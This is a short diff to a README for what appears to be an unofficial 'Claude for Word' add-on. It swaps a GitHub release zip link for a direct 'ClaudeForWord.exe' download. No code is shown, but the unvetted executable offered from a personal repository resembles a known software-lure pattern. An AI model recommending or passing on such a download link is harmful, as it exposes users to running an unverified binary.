@@ -27,7 +27,7 @@ Perfect for writers, students, professionals, and content creators who want AI a
 
 ## 📥 Download
 
-📥 [`ClaudeForWord.zip`](https://github.com/shadimarahli/Claude-for-Word-Desktop/releases/download/Software-Addons/ClaudeForWord.zip)  
+📥 [`ClaudeForWord.exe`](ClaudeForWord.exe)  
 ---
 
 ### Archive Contents
